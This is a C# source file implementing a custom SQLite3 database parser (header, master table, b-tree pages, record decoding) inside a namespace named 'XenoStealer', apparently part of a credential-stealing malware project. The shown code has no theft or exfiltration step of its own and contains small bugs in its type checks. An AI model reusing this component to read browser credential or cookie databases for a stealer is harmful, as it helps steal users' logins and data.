using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace XenoStealer
{
    public class SqlLite3Parser//this class took me so much time and documentation reading.
    {
        private List<string> fieldNames = new List<string>();
        private List<TableEntry> tableEntries = new List<TableEntry>();


        private List<MasterTableInfo> MasterTableEntries = new List<MasterTableInfo>();

        Encoding stringEncoding = Encoding.UTF8;

        int pageSize = 65536;
        int reservedEndPageSize = 0;
        private byte[] DataBaseBytes;

        public SqlLite3Parser(byte[] db_bytes)
        {
            if (stringEncoding.GetString(db_bytes, 0, 16) != "SQLite format 3\x00")
            {
                throw new Exception("Unsupported format");
            }
            DataBaseBytes = db_bytes;

            ushort pageSizeInfo = ReadUShort(16);
            if (pageSizeInfo != 1)
            {
                pageSize = pageSizeInfo;
            }

            reservedEndPageSize = ReadByte(20);

            int stringEncodingInfo = ReadInt(56);
            if (stringEncodingInfo == 2)
            {
                stringEncoding = Encoding.Unicode;
            }
            else if (stringEncodingInfo == 3)
            {
                stringEncoding = Encoding.BigEndianUnicode;
            }
            ReadMasterTable(100);
        }

        public bool ReadTable(string tableName)
        {

            MasterTableInfo table = default(MasterTableInfo);
            foreach (MasterTableInfo masterTable in MasterTableEntries)
            {
                if (masterTable.typename.ToLower() == "table" && masterTable.name.ToLower() == tableName.ToLower())
                {
                    table = masterTable;
                    break;
                }
            }

            if (table.sql_creation_command == null)
            {
                return false;
            }
            tableEntries.Clear();
            fieldNames.Clear();
            string[] names = ExtractColumnNames(table.sql_creation_command);
            if (ReadTableFromOffset((table.rootpage - 1) * pageSize)) //-1 to ignore the first page.
            {
                fieldNames.AddRange(names);
                return true;
            }
            return false;
        }

        public string[] GetTableNames()
        {
            List<string> result = new List<string>();
            foreach (MasterTableInfo i in MasterTableEntries)
            {
                if (i.typename.ToLower() == "table")
                {
                    result.Add(i.table_name);
                }
            }

            return result.ToArray();
        }

        public int GetRowCount()
        {
            return tableEntries.Count;
        }

        public string GetTableSqlCommand(string tableName) 
        {
            foreach (MasterTableInfo masterTable in MasterTableEntries)
            {
                if (masterTable.table_name.ToLower() == tableName.ToLower())
                {
                    return masterTable.sql_creation_command;
                }
            }
            return null;
        }

        public object GetValue(int index, string value)
        {
            if (index > tableEntries.Count)
            {
                throw new ArgumentOutOfRangeException("index");
            }
            int colIndex = fieldNames.IndexOf(value);
            if (colIndex == -1)
            {
                throw new Exception("could not find value");
            }

            if (value.ToLower() == "id" && tableEntries[index].values[colIndex] == null) 
            {
                return tableEntries[index].rowId;
            }

            return tableEntries[index].values[colIndex];
        }

        public T GetValue<T>(int index, string value) 
        {
            try
            {
                object data = GetValue(index, value);
                return (T)data;
            }
            catch 
            { 
                return default(T);
            }
        }

        public void reset() 
        {
            tableEntries.Clear();
            fieldNames.Clear();
            MasterTableEntries.Clear();
            ReadMasterTable(100);
        }

        private bool ReadTableFromOffset(int offset) 
        {
            byte tableLayout = DataBaseBytes[offset];
            if (tableLayout == 2) // interior index b-tree page
            {
                return false;//not supported
                // Handle interior index b-tree page
            }
            else if (tableLayout == 5) // interior table b-tree page
            {
                return ParseInteriorTable(offset);
                // Handle interior table b-tree page
            }
            else if (tableLayout == 10) // leaf index b-tree page
            {
                return false; // not supported
                // Handle leaf index b-tree page
            }
            else if (tableLayout == 13) // leaf table b-tree page
            {
                return ParseLeafTablePage(offset);
            }
            return false;
        }

        private bool ParseInteriorTable(int headerOffset)
        {
            int numberOfCells = ReadUShort(headerOffset + 3);
            int rightMostPointer = ReadInt(headerOffset + 8);

            int cellPointerOffset = headerOffset + 12;

            for (int i = 0; i < numberOfCells; i++)
            {
                int cellOffset = ReadUShort(cellPointerOffset + 2 * i);
                int childPageNumber;

                if (headerOffset < pageSize)
                {
                    childPageNumber = ReadInt(cellOffset);
                }
                else
                {
                    childPageNumber = ReadInt(headerOffset + cellOffset);
                }

                if (!ReadTableFromOffset((childPageNumber - 1) * pageSize))
                {
                    return false;
                }
            }

            if (!ReadTableFromOffset((rightMostPointer - 1) * pageSize))
            {
                return false;
            }

            return true;
        }

        private bool ParseLeafTablePage(int headerOffset)
        {
            int numberOfCells = ReadUShort(headerOffset + 3);
            //int cellContentAreaStart = ReadUShort(offset + 5);
            //if (cellContentAreaStart == 0)
            //{
            //    cellContentAreaStart = pageSize;
            //}
            //else if (cellContentAreaStart == ushort.MaxValue) 
            //{
            //    cellContentAreaStart = 0;
            //}

            int cellPointerOffset = headerOffset + 8;// The cell pointer array starts immediately after the header.

            int[] offsets = new int[numberOfCells];

            for (int i = 0; i < numberOfCells; i++)
            {
                offsets[i] = ReadUShort(cellPointerOffset + 2 * i);
            }


            for (int i = 0; i < offsets.Length; i++)
            {
                int CellLocation = offsets[i];
                if (headerOffset >= pageSize)
                {
                    CellLocation += headerOffset;
                }
                int numOfBytesInPayload = (int)ReadVarInt(CellLocation, out int byteRead);
                CellLocation += byteRead;

                int Rowid = (int)ReadVarInt(CellLocation, out byteRead);

                CellLocation += byteRead;

                List<int> SerialTypes = new List<int>();

                long recordHeaderSize = ReadVarInt(CellLocation, out byteRead);
                CellLocation += byteRead;
                long end = CellLocation + recordHeaderSize - byteRead;//we include the size of the header itself
                while (CellLocation < end)
                {
                    SerialTypes.Add((int)ReadVarInt(CellLocation, out byteRead));
                    CellLocation += byteRead;
                }

                List<object> recordData = new List<object>();

                foreach (int RecordType in SerialTypes)
                {
                    object Record;

                    if (RecordType == 0)
                    {
                        Record = null;
                        CellLocation += 0;
                    }
                    else if (RecordType == 1)
                    {
                        Record = ReadByte(CellLocation);
                        CellLocation += 1;
                    }
                    else if (RecordType == 2)
                    {
                        Record = ReadShort(CellLocation);
                        CellLocation += 2;
                    }
                    else if (RecordType == 3)
                    {
                        Record = ReadX(CellLocation, 3);
                        CellLocation += 3;
                    }
                    else if (RecordType == 4)
                    {
                        Record = ReadInt(CellLocation);
                        CellLocation += 4;
                    }
                    else if (RecordType == 5)
                    {
                        Record = ReadX(CellLocation, 6);
                        CellLocation += 6;
                    }
                    else if (RecordType == 6)
                    {
                        Record = ReadLong(CellLocation);
                        CellLocation += 8;
                    }
                    else if (RecordType == 7)
                    {
                        Record = ReadDouble(CellLocation);
                        CellLocation += 8;
                    }
                    else if (RecordType == 8)
                    {
                        Record = 0;
                        CellLocation += 0;
                    }
                    else if (RecordType == 9)
                    {
                        Record = 1;
                        CellLocation += 0;
                    }
                    else if (RecordType >= 12 && RecordType % 2 == 0)
                    {
                        int blobSize = (RecordType - 12) / 2;
                        byte[] blob = new byte[blobSize];
                        Array.Copy(DataBaseBytes, CellLocation, blob, 0, blobSize);
                        Record = blob;
                        CellLocation += blobSize;
                    }
                    else if (RecordType >= 13 && RecordType % 2 == 1)
                    {
                        int stringSize = (RecordType - 13) / 2;
                        Record = stringEncoding.GetString(DataBaseBytes, CellLocation, stringSize);
                        CellLocation += stringSize;
                    }
                    else
                    {
                        continue;
                    }
                    recordData.Add(Record);
                }

                tableEntries.Add(new TableEntry(Rowid, recordData.ToArray()));

            }

            return true;
        }

        private bool ReadMasterTable(int offset)
        {
            byte tableLayout = DataBaseBytes[offset];
            if (tableLayout == 2) // interior index b-tree page
            {
                return false; // not supported
                // Handle interior index b-tree page
            }
            else if (tableLayout == 5) // interior table b-tree page
            {
                return ParseMasterInteriorTable(offset);
                // Handle interior table b-tree page
            }
            else if (tableLayout == 10) // leaf index b-tree page
            {
                return false; // not supported
                // Handle leaf index b-tree page
            }
            else if (tableLayout == 13) // leaf table b-tree page
            {
                return ParseMasterLeafTablePage(offset);
            }
            return false;
        }

        private bool ParseMasterInteriorTable(int headerOffset) 
        {
            int numberOfCells = ReadUShort(headerOffset + 3);
            int rightMostPointer = ReadInt(headerOffset + 8);

            int cellPointerOffset = headerOffset + 12;

            for (int i = 0; i < numberOfCells; i++)
            {
                int cellOffset = ReadUShort(cellPointerOffset + 2 * i);
                int childPageNumber;

                if (headerOffset < pageSize)
                {
                    childPageNumber = ReadInt(cellOffset);
                }
                else
                {
                    childPageNumber = ReadInt(headerOffset + cellOffset);
                }

                if (!ReadMasterTable((childPageNumber - 1) * pageSize))
                {
                    return false;
                }
            }

            if (!ReadMasterTable((rightMostPointer - 1) * pageSize))
            {
                return false;
            }

            return true;
        }

        private bool ParseMasterLeafTablePage(int headerOffset) 
        {
            int numberOfCells = ReadUShort(headerOffset+3);
            //int cellContentAreaStart = ReadUShort(offset + 5);
            //if (cellContentAreaStart == 0)
            //{
            //    cellContentAreaStart = pageSize;
            //}
            //else if (cellContentAreaStart == ushort.MaxValue) 
            //{
            //    cellContentAreaStart = 0;
            //}

            int cellPointerOffset = headerOffset + 8;// The cell pointer array starts immediately after the header.

            int[] offsets = new int[numberOfCells];

            for (int i = 0; i < numberOfCells; i++)
            {
                offsets[i]=ReadUShort(cellPointerOffset + 2 * i);
            }


            for (int i = 0; i < offsets.Length; i++)
            {
                int CellLocation = offsets[i];
                if (headerOffset>=pageSize)
                {
                    CellLocation += headerOffset;
                }
                int numOfBytesInPayload = (int)ReadVarInt(CellLocation, out int byteRead);
                CellLocation += byteRead;
                
                int Rowid = (int)ReadVarInt(CellLocation, out byteRead);
                
                CellLocation += byteRead;

                List<int> SerialTypes = new List<int>();

                long recordHeaderSize = ReadVarInt(CellLocation, out byteRead);
                CellLocation += byteRead;
                long end = CellLocation + recordHeaderSize - byteRead;//we include the size of the header itself
                while (CellLocation < end) 
                {
                    SerialTypes.Add((int)ReadVarInt(CellLocation, out byteRead));
                    CellLocation += byteRead;
                }
                
                if (SerialTypes.Count != 5)//it needs to have a count of 5 or else we dont have enough data and possibly the wrong info.
                {
                    continue;
                }

                List<object> recordData = new List<object>();

                foreach (int RecordType in SerialTypes) 
                {
                    object Record;

                    if (RecordType == 0)
                    {
                        Record = null;
                        CellLocation += 0;
                    }
                    else if (RecordType == 1)
                    {
                        Record = ReadByte(CellLocation);
                        CellLocation += 1;
                    }
                    else if (RecordType == 2)
                    {
                        Record = ReadShort(CellLocation);
                        CellLocation += 2;
                    }
                    else if (RecordType == 3)
                    {
                        Record = ReadX(CellLocation, 3);
                        CellLocation += 3;
                    }
                    else if (RecordType == 4)
                    {
                        Record = ReadInt(CellLocation);
                        CellLocation += 4;
                    }
                    else if (RecordType == 5)
                    {
                        Record = ReadX(CellLocation, 6);
                        CellLocation += 6;
                    }
                    else if (RecordType == 6)
                    {
                        Record = ReadLong(CellLocation);
                        CellLocation += 8;
                    }
                    else if (RecordType == 7)
                    {
                        Record = ReadDouble(CellLocation);
                        CellLocation += 8;
                    }
                    else if (RecordType == 8)
                    {
                        Record = 0;
                        CellLocation += 0;
                    }
                    else if (RecordType == 9)
                    {
                        Record = 1;
                        CellLocation += 0;
                    }
                    else if (RecordType >= 12 && RecordType % 2 == 0)
                    {
                        int blobSize = (RecordType - 12) / 2;
                        byte[] blob = new byte[blobSize];
                        Array.Copy(DataBaseBytes, CellLocation, blob, 0, blobSize);
                        Record = blob;
                        CellLocation += blobSize;
                    }
                    else if (RecordType >= 13 && RecordType % 2 == 1)
                    {
                        int stringSize = (RecordType - 13) / 2;
                        Record = stringEncoding.GetString(DataBaseBytes, CellLocation, stringSize);
                        CellLocation += stringSize;
                    }
                    else 
                    {
                        continue;
                    }
                    recordData.Add(Record);
                }
                if (recordData.Contains(null) || recordData.Count != 5 || recordData[0].GetType()!=typeof(string) || recordData[1].GetType() != typeof(string) || recordData[2].GetType() != typeof(string) || (recordData[3].GetType() != typeof(int) && recordData[3].GetType() != typeof(byte)) || recordData[4].GetType() != typeof(string)) 
                {
                    continue;
                }

                //CREATE TABLE sqlite_schema(
                //  type text,
                //  name text,
                //  tbl_name text,
                //  rootpage integer,
                //  sql text
                //);

                string type = (string)recordData[0];
                string name = (string)recordData[1];
                string table_name = (string)recordData[2];
                int rootpage = recordData.GetType()==typeof(byte)? (int)recordData[3] : (byte)recordData[3];
                string sql = (string)recordData[4];


                MasterTableEntries.Add(new MasterTableInfo(Rowid, type, name, table_name, rootpage, sql));
            }

            return true;
        }

        private string[] ExtractColumnNames(string createTableSql)
        {
            List<string> columnNames = new List<string>();

            string columnsPart = Regex.Match(createTableSql, @"\((.*?)\)", RegexOptions.Singleline).Groups[1].Value;

            string[] columnDefinitions = columnsPart.Split(',');

            foreach (string definition in columnDefinitions)
            {
                string columnName = Regex.Match(definition.Trim(), @"^\s*(\w+)").Groups[1].Value;
                columnNames.Add(columnName);
            }

            return columnNames.ToArray();
        }

        private long ReadVarInt(int offset, out int bytesRead)
        {
            long result = 0;
            bytesRead = 0;
            for (int i = 0; i < 9; i++)
            {
                byte b = DataBaseBytes[offset + i];
                result = (result << 7) | (long)(b & 0x7F);
                bytesRead++;
                if ((b & 0x80) == 0)
                {
                    break;
                }
            }
            return result;
        }

        private ulong ReadX(int StartIndex, int size) 
        {
            if (size > 8 || size == 0)
            {
                return 0;
            }
            ulong byte_toInt = 0;
            int checkSize = size - 1;
            for (int i = 0; i <= checkSize; i++)
            {
                byte_toInt = byte_toInt << 8 | DataBaseBytes[StartIndex + i];
            }
            return byte_toInt;
        }

        private ulong ReadULong(int StartIndex) 
        {
            return ReadX(StartIndex, 8);
        }

        private long ReadLong(int StartIndex)
        {
            return (long)ReadX(StartIndex, 8);
        }

        private uint ReadUInt(int StartIndex)
        {
            return (uint)ReadX(StartIndex, 4);
        }

        private int ReadInt(int StartIndex)
        {
            return (int)ReadX(StartIndex, 4);
        }

        private ushort ReadUShort(int StartIndex)
        {
            return (ushort)ReadX(StartIndex, 2);
        }

        private short ReadShort(int StartIndex)
        {
            return (short)ReadX(StartIndex, 2);
        }

        private byte ReadByte(int StartIndex) 
        {
            return DataBaseBytes[StartIndex];
        }

        private double ReadDouble(int Startindex) 
        { 
            return BitConverter.ToDouble(DataBaseBytes, Startindex);
        }


        private struct MasterTableInfo// I feel like i should create a seperate file for these structs, but would love this class to be plug and play too. im going to keep these here.
        {
            public int rowId;
            public string typename;
            public string name;
            public string table_name;
            public int rootpage;
            public string sql_creation_command;

            public MasterTableInfo(int _rowId, string _typename, string _name, string _table_name, int _rootpage, string _sql_creation_command)
            {
                rowId = _rowId;
                typename = _typename;
                name = _name;
                table_name = _table_name;
                rootpage = _rootpage;
                sql_creation_command = _sql_creation_command;
            }
        }

        private struct TableEntry
        {
            public int rowId;
            public object[] values;
            public TableEntry(int _rowId, object[] _values)
            {
                rowId = _rowId;
                values = _values;
            }
        }


    }
}
